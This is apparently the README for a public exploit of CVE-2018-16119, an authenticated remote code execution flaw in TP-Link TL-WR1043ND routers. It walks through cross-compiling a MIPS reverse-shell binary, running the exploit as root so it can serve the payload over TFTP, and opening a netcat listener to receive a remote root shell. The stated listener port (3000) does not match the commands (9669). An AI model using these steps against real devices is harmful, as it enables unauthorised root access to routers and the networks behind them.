# CVE-2018-16119 Authenticated Remote Code Execution TP-Link WR1043ND
# http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16119

Exploit to get Remote Root Shell in TP-Link TP-Link TL-WR1043ND Devices

1) Do not forget to modify and compile reverse_shell_mipsbe.c with the name of shh
	. cp reverse_shell_mipsbe.c /tmp/
	. docker run -v /tmp/:/tmp/ -it asmimproved/qemu-mips /bin/bash
	Inside Docker:
		. cd /tmp ; mips-linux-gnu-gcc -static reverse_shell_mipsbe.c -o shh
	Outside Docker:
		. cp /tmp/shh .

2) The exploit need Authentication. I know, it is not so good
3) Run the exploit as root. 
   This is needed by the exploit to start a tftp server in port 69
4) Start a listener in port 3000 in order to receive the Shell:
	Linux:
		nc -l -p 9669 -vv
	OS X:
		nc -l 9669 -vv

5) Do not wait a verbose message on NetCat, just start sending commands!

Thanks for your time!

You can contact me in Twitter as @SecSignal and in Linkeding as Alejandro Parodi
